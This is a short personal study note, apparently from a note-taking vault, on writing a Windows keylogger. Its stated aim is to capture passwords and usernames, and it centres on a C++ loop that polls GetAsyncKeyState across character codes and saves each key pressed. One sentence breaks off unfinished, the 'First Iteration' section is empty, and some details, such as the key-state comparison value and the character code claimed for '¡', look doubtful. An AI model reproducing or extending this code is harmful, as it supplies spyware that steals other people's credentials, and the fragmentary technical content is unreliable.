**Title:** ILY - Keylogger
**Tags:** [[ILY - Easy]]
**Topics:**

---
# ILY - Keylogger
# General
## startLogging()
Is not possible to know which key has been pressed after it happened, so the only way to know it is to check all possible valid keys in the ASCII symbols every time. Due to or goal, grab passwords and usernames, the last valid symbol is the "¡" that has the number 173.

Now that we are checking all the possible characters, its important to determine how are we going to 
```c++
for (char key = 8; key<=173; key++) {
	if (GetAsyncKeyState(key) == 0xFFFF8001) {
	    if (not specialKey(key)) {
            string str(1, key);
            save(str);
        }
    }
}
```

# First Iteration
